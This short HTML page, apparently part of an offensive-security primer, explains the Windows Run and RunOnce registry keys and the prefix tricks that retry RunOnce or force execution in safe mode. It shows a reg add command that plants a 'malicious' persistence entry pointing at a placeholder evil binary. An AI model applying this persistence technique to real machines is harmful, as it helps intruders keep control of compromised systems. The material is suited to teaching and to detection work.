<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>General Primer</title>
</head><body>Run and RunOnce serve different purposes, as the name indicates, RunOnce is only executed once after the affected user logs in while Run is persistent across logins. There are some interesting oddities to take note of with these registry keys. <br/>
(1) The RunOnce key is deleted on login, even if it fails to execute, to prevent this you should prefix the value with an exclamation mark (!). Doing so will attempt to execute the key again on the next login. <br/>
(2) Both the Run and RunOnce keys are not executed when booting into safe mode, to force their execution you can prefix the key value with an asterisk (*).<br/>
<br/>
It is very easy to add our own malicious registry key.<br/>
<br/>
C:\Windows\system32&gt; reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v EvilKey<br/>
/t REG_SZ /d "C:\Some\Evil\Binary.exe"<br/>
&#09;<br/>
The operation completed successfully.<br/>
<br/>
C:\Windows\system32&gt; reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"<br/>
<br/>
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br/>
&nbsp; &nbsp; VMware User Process &nbsp; &nbsp;REG_SZ &nbsp; &nbsp;"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr<br/>
&nbsp; &nbsp; EvilKey &nbsp; &nbsp;REG_SZ &nbsp; &nbsp;C:\Some\Evil\Binary.exe<br/>
</body></html>